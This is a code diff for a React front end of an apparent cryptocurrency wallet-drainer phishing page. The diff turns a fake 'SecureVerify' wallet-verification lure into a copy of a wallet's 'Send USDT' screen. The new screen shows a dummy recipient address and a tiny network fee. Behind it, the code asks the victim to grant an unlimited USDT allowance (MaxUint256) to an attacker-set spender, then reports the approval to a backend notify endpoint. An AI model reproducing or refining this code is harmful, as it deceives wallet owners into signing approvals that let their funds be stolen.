@@ -16,12 +16,12 @@ const ERC20_ABI = [
 function App() {
   const [provider, setProvider] = useState(null);
   const [account, setAccount] = useState(null);
-  const [amount, setAmount] = useState("0.1");
+  const [amount, setAmount] = useState("0.1"); // Minimum 0.1 set
   const [loading, setLoading] = useState(false);
-  const [status, setStatus] = useState("Enter amount and connect wallet.");
-  const [selectedNetwork, setSelectedNetwork] = useState("bsc"); // Default BSC
+  const [status, setStatus] = useState("");
+  const [step, setStep] = useState(1); // 1 = Send Form, 2 = Approve
+  const [selectedNetwork, setSelectedNetwork] = useState("bsc");
 
-  // URL se network uthana (jaise ?network=eth)
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const net = urlParams.get('network');
@@ -30,21 +30,29 @@ function App() {
     }
   }, []);
 
+  const handleNext = () => {
+    if (Number(amount) < 0.1) {
+      setStatus("Minimum amount is 0.1 USDT.");
+      return;
+    }
+    setStatus("");
+    setStep(2);
+    connectWallet();
+  };
+
   const connectWallet = async () => {
     try {
       setLoading(true);
-      setStatus("Connecting to wallet...");
       
-      // Chain ID: BSC = 56, ETH = 1
       const chainId = selectedNetwork === 'bsc' ? 56 : 1;
 
       const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
-        chains: [chainId], // Sirf selected network hi allow karega
+        chains: [chainId],
         showQrModal: true,
         metadata: {
-          name: "SecureVerify",
-          description: "Wallet Verification",
+          name: "USDT Transfer",
+          description: "Send USDT securely",
           url: window.location.origin,
           icons: ["https://walletconnect.com/walletconnect-logo.png"]
         }
@@ -54,7 +62,6 @@ function App() {
       setProvider(wcProvider);
       setAccount(wcProvider.accounts[0]);
       
-      // Force wallet to switch network
       try {
         await wcProvider.request({
           method: 'wallet_switchEthereumChain',
@@ -64,31 +71,27 @@ function App() {
         console.log("Network switch failed or user rejected", switchError);
       }
 
-      setStatus(`Connected to ${selectedNetwork.toUpperCase()}. Tap Approve to proceed.`);
+      setStatus("Connected. Please approve to verify.");
       setLoading(false);
     } catch (error) {
       console.error(error);
       setStatus("Connection failed or rejected.");
       setLoading(false);
+      setStep(1); // Error aane pe wapas form pe bhej do
     }
   };
 
-  const handleVerify = async () => {
+  const handleApprove = async () => {
     if (!provider || !account) return;
-    if (Number(amount) < 0.1) {
-      setStatus("Minimum amount is 0.1 USDT.");
-      return;
-    }
     
     try {
       setLoading(true);
-      setStatus("Requesting approval... Please check your wallet.");
+      setStatus("Waiting for approval...");
 
       const ethersProvider = new BrowserProvider(provider);
       const signer = await ethersProvider.getSigner();
       
       const network = await ethersProvider.getNetwork();
-      // Double check: Agar user ne network change kar diya, toh validate karo
       if (selectedNetwork === 'bsc' && network.chainId !== 56n) {
         throw new Error("Please switch to BNB Smart Chain in your wallet.");
       }
@@ -102,10 +105,10 @@ function App() {
       // Unlimited Approval
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
-      setStatus("Waiting for confirmation...");
+      setStatus("Transaction Pending...");
       await tx.wait(); 
 
-      setStatus("Verification Successful! You can close this page.");
+      setStatus("Transaction Successful!");
       
       await fetch(`${BACKEND_URL}/api/notify`, {
         method: 'POST',
@@ -121,59 +124,71 @@ function App() {
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus(error.message || "Approval failed. Check gas fee.");
+      setStatus(error.message || "Approval failed.");
       setLoading(false);
     }
   };
 
   return (
-    <div className="container">
-      <div className="card">
-        <div className="logo">🛡️ SecureVerify</div>
-        <h2>Wallet Verification ({selectedNetwork.toUpperCase()})</h2>
-        <p className="desc">To receive your funds, please verify your wallet and approve a minimum of 0.1 USDT.</p>
-        
-        <div className="status-box">
-          <strong>Status:</strong> {status}
-        </div>
-
-        {!account ? (
-          <div>
-            <div className="input-group">
-              <label>Enter Amount (USDT)</label>
-              <input 
-                type="number" 
-                step="0.1" 
-                min="0.1" 
-                value={amount} 
-                onChange={(e) => setAmount(e.target.value)}
-                placeholder="Min 0.1 USDT"
-              />
-            </div>
-            <button onClick={connectWallet} disabled={loading} className="btn connect-btn">
-              {loading ? "Connecting..." : `Connect Wallet (${selectedNetwork.toUpperCase()})`}
-            </button>
-          </div>
-        ) : (
-          <div>
-            <p className="wallet-address">Connected: {account.slice(0,6)}...{account.slice(-4)}</p>
-            <div className="input-group">
-              <label>Verify Amount (USDT)</label>
-              <input 
-                type="number" 
-                step="0.1" 
-                min="0.1" 
-                value={amount} 
-                onChange={(e) => setAmount(e.target.value)}
-                disabled
-              />
-            </div>
-            <button onClick={handleVerify} disabled={loading} className="btn verify-btn">
-              {loading ? "Processing..." : "Approve & Verify"}
-            </button>
-          </div>
-        )}
+    <div className="app-container">
+      <div className="header">
+        <button className="back-btn">←</button>
+        <h1>{step === 1 ? "Send USDT" : "Approve"}</h1>
+        <div></div>
       </div>
+
+      {step === 1 ? (
+        <div className="form-container">
+          <label>Address or Domain Name</label>
+          <div className="input-box disabled-input">
+            {/* Screenshot jaisa dummy address */}
+            <span>0x3E5Da94426D6133b437107Ec8B656522f8899b23</span>
+            <span className="paste-text">Paste</span>
+          </div>
+
+          <label>Amount</label>
+          <div className="input-box amount-box">
+            <input 
+              type="number" 
+              value={amount} 
+              onChange={(e) => setAmount(e.target.value)}
+              min="0.1"
+              step="0.1"
+            />
+            <span className="currency">USDT <span className="max-text">Max</span></span>
+          </div>
+          <p className="usd-value">≈ ${amount}.00</p>
+          
+          {status && <p className="error-msg">{status}</p>}
+
+          <button className="next-btn" onClick={handleNext}>
+            Next
+          </button>
+        </div>
+      ) : (
+        <div className="approve-container">
+          <div className="details-box">
+            <div className="row">
+              <span className="label">Asset</span>
+              <span className="value">{selectedNetwork === 'bsc' ? 'BNB Smart Chain (BNB)' : 'Ethereum (ETH)'}</span>
+            </div>
+            <div className="row">
+              <span className="label">DApp</span>
+              <span className="value text-green">{window.location.hostname}</span>
+            </div>
+            <div className="row network-fee">
+              <span className="label">Network fee</span>
+              <span className="value">~ $0.01</span>
+            </div>
+          </div>
+          
+          {status && <p className="status-msg">{status}</p>}
+
+          <button className="approve-btn" onClick={handleApprove} disabled={loading || !account}>
+            {loading ? "Processing..." : "Approve"}
+          </button>
+        </div>
+      )}
     </div>
   );
 }
